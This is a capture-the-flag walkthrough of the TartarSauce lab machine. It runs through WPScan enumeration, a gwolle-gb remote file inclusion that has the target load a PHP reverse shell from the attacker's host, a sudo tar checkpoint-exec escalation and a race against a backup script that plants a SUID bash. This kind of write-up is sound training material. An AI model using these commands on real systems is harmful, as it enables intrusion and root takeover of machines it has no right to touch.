#box #enumeration #wordpress #wpscan #gwolle-gb #sudo-impersonation #UnknownSUIDBinary #tar #GTFOBins 
1. The machine shows an open port 80 where the landing page is a simple webpage with some ASCII art on it.
2. After some enumeration we discover first the `/webservices` endpoint
3. Then we discover the `/wp` endpoint on which we find a very simple website and add the `tartarsauce.htb` host to `/etc/hosts`
4. After discovering it, we run `WPScan` to discover for potential vulnerabilities and discover a plugin named `gwolle-gb` on version `2.3.10`
```sh
wpscan --url http://tartarsauce.htb/webservices/wp --plugins-detection aggressive
```
5. That version of `gwolle-gb` is vulnerable to RFI since version `1.5.3` at https://www.exploit-db.com/exploits/38861. To make that work, we host a file on our end named `wp-load.php` containing a reverse shell and then target our machine and port. Our `wp-load.php` will contain `PentestMonkey PHP Reverse Shell` pointing on port 4444
```sh
curl 'http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.194:8003/'
```
6. Once obtained the shell as `www-data` we discover that this user can run `/bin/tar` as the user `onuma` through sudo impersonation. We use the `sudo` GTFOBins to gain a session as the user `onuma` https://gtfobins.org/gtfobins/tar/
```sh
sudo -u onuma /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
![[attachments/tartarsauce-1.png]]
7. Once landed on the user `onuma` we discover a peculiar script which seems to be ran every 5 minutes. Its name is `backuperer` and that's what it does:
```sh
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```
This script, does the following actions:
* Prints a message saying when the last backup has ran
* Removes the previous run backup and check folder
* Runs tar as the user onuma on `/var/tmp/.$RANDOM_STRING`
* Sleeps 30 seconds
* Creates a `/var/tmp/check` folder
* Extract `/var/tmp/.$RANDOM_STRING` into `/var/tmp/check`
* If `/usr/bin/diff -r /var/www/html /var/tmp/check/var/www/html` are equal, it moves the temp file `/var/tmp/.$RANDOM_STRING` into `/var/backups/onuma-www-dev.bak`.
* If that fails, it returns the error message inside `/var/backups/onuma_backup_error.txt`
8. To properly gain a step ahead we must makes sure that the condition fails. To do that, we must enter in the `if $true` condition. To do that, we can try on our end how the `$(integrity_chk)` works to understand how to make it fail. If moved on our terminal, the condition looks like the following:
```sh
if [[ $(/usr/bin/diff -r /var/www/html /var/tmp/check/var/www/html) ]]; then echo "SUCCESS"; else echo "FAIL"; fi
```
By default this condition will fail. But, if we create the folder `/var/tmp/check/var/www/html` it will succeed. So, it mean we must create a condition where the `/var/tmp/check/var/www/html` folder is already created during the integrity check.
To do that, we'll add the folder and a sample file in it
```sh
mkdir -p var/www/html
touch var/www/html/test
```
Then we `tar` the folder
```sh
tar -zcvf bk.tar.gz var
```
Finally, we move it on the target machine. Once the `$tmpfile` is created, we have 30 seconds to `cp bk.tar.gz $tmpfile`. This will basically copy our tar inside the temporary file.
![[attachments/tartarsauce-2.png]]
```sh
cp bk.tar.gz .447c43a92dd8f476441a7d5b4eef603968f2ef76
```
Once this is done, after 30 seconds the `$tmpfile` will be extracted and since it'll also contain our `tar` file, it'll be extracted as `var/www/html` inside the `check` folder. Since at this point `/var/tmp/check/var/www/html` will exist, the `$integrity_chk` will succeed, and the `check` folder won't be deleted.
Now, inside the folder we'll find the `test` file previously added to the `tar` file at `var/www/html`. 
9. Now, we could do the same stuff with a SUID `/bin/bash` binary. However, the machine is a 32bit machine and copy pasting our machine `/bin/bash` will fail since our machine is a 64bit machine. So, what we do is copy the `/bin/bash` binary from the `tartarsauce` machine to our end and then:
```sh
curl http://tartarsauce.htb:8000/bash -o bash
chown root bash
chmod 4777 bash
mkdir -p var/www/html
mv bash var/www/html
tar -zcvf bk.tar.gz var
```
Then, we copy it back on the target machine and repeat the steps above. In between the 30 seconds we'll copy the `tar.gz` inside the `$tmpfile`. Once `$tmpfile` is extracted, we'll have a SUID bash binary ready to use and to escalate.
![[attachments/tartarsauce-3.png]]
![[attachments/tartarsauce-4.png]]